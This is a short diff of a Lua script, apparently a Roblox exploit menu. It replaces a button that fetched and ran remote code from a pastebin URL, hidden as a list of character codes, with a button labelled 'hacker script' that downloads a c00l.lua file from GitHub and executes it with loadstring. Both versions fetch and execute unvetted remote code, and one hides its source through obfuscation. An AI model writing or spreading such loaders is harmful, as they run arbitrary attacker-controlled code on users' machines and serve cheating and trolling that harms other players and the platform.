@@ -62,15 +62,11 @@ local Tab = Window:MakeTab({
     PremiumOnly = false
 })
 
-local Section = Tab:AddSection({
-    Name = "功能"
-})
-
 Tab:AddButton({
-    Name = "鸭",
-    Callback = function()
-loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,81,89,49,113,112,99,115,106})end)())))()
-   end
+	Name = "黑客脚本",
+	Callback = function()
+loadstring(game: HttpGet("https://raw.githubusercontent.com/BirthScripts/Scripts/main/c00l.lua"))()
+    end
 })
 
 Tab:AddButton({
